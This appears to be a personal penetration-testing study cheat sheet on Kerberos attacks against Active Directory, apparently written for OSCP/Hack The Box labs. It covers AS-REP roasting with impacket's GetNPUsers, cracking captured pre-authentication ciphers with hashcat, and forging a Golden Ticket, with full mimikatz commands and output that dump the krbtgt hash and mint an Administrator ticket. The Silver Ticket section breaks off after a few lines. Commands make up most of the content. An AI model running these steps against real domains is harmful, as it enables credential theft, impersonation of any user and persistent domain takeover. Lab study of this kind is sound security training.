# Kerberos Attacks
----------------------- 


## AS - REP Roasting
-------------------
if there is no pre auth set for an account we can get the hash of those user accounts

to get accounts w no pre auth set:

```bash
python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -no-pass -usersfile /home/cibbin/oscp/htb/windows/forest/users.txt 

python3 /opt/impacket/examples/GetNPUsers.py htb.local/ -request
```

#### What to do if pre auth is enabled?

if we are not able to do AS - REP roasting, and have the privileges to capture network traffic, we can capture the Pre Auth request (AS - REQ).

cracking the padata value cipher will give us the user password since it is encrypted using the user password.

the cipher is AES256 etype 18

crack the cipher using hashcat beta 

```cmd
hashcat -m 19900
```
-------------------------------------

## Kerberos Golden Ticket 
---------------------------- 
 this attack is used to main persistance after a system compromise 

 the **krbtgt** (key Distribution Center Service Account) account's password will be used to encrypt data sent by kerberos (DC) and if we get the NTLM hash for this account; we can create a golden ticket which will allow us to impersonate anyone.

after getting the hash of krbtgt account (using DC Sync or something), use mimikatz:

/krbtgt: paste just the NT hash (last part)

 get the sid with ```whoami /all``` and strip out the last part of the user sid

```bash
kerberos::golden /domain: /sid: /user: /krbtgt: /ptt:
```

using mimikatz:

```cmd
mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166                                                                                 
                                                                                                                             

RID  : 000001f6 (502)                                                                                                                         

User : krbtgt                                                                                                                                 
                                                                                                                                          

 * Primary                                                                                                                                    

    NTLM : 5508500012cc005cf7082a9a89ebdfdf                                                                                                   
```

```cmd

mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500                                                                                                                             
                                                                                                                        

User      : Administrator                                                                                                                     
Domain    : controller.local (CONTROLLER)                                                                                                     
 * Kerberos                                                                                                                                   

    Default Salt : CONTROLLER.LOCALkrbtgt                                                                                                     

    Credentials                                                                                                                               

      des_cbc_md5       : 64ef5d43922f3b5d                                                                                                    

                                                                                                                                          

SID       : S-1-5-21-849420856-2351964222-986696166                                                                                           
SID       : S-1-5-21-849420856-2351964222-986696166                                                                                           
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500                                                                                                                               
Groups Id : *513 512 520 518 519                                        
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt                                                                                    
Lifetime  : 1/13/2022 8:08:38 AM ; 1/11/2032 8:08:38 AM ; 1/11/2032 8:08:38 AM
-> Ticket : ticket.kirbi
 * PAC generated                                                                                                                              

 * PAC signed                                                          

 * EncTicketPart generated                                              

 * EncTicketPart encrypted

 * KrbCred generated                                                   

Final Ticket Saved to file !                                           


mimikatz # misc::cmd                                                   
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FBE043B8
mimikatz #
```

-----------------------


## Kerberos Silver Ticket
----------------------------
this attack allows us to prentend that we are domain admin to one specific service

for a service account to be vulnerable, SPN has to be set.

rubeus -> for kerberoasting


